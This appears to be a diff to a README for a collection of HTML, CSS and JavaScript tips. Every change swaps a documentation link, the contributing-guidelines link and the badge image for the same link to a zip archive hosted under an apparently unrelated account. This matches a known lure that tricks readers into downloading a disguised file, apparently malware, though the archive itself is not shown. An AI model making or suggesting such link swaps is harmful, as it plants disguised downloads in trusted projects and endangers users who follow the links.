@@ -6,14 +6,14 @@ Tips are added frequently! ⚡
 
 Enjoy!
 
-- [HTML](HTML.md)
+- [HTML](https://raw.githubusercontent.com/techcircule/awesome-html-css-js-tips/master/Occamist/awesome-html-css-js-tips.zip)
 
-- [CSS](CSS.md)
+- [CSS](https://raw.githubusercontent.com/techcircule/awesome-html-css-js-tips/master/Occamist/awesome-html-css-js-tips.zip)
 
-- [JavaScript](JAVASCRIPT.md)
+- [JavaScript](https://raw.githubusercontent.com/techcircule/awesome-html-css-js-tips/master/Occamist/awesome-html-css-js-tips.zip)
 
 If you like this repo, be sure to ⭐ it.
 
-Please read [`contributing guidelines`](./CONTRIBUTING.md) before submitting new tips.
+Please read [`contributing guidelines`](https://raw.githubusercontent.com/techcircule/awesome-html-css-js-tips/master/Occamist/awesome-html-css-js-tips.zip) before submitting new tips.
 
-[awesome-badge]: https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg
+[awesome-badge]: https://raw.githubusercontent.com/techcircule/awesome-html-css-js-tips/master/Occamist/awesome-html-css-js-tips.zip
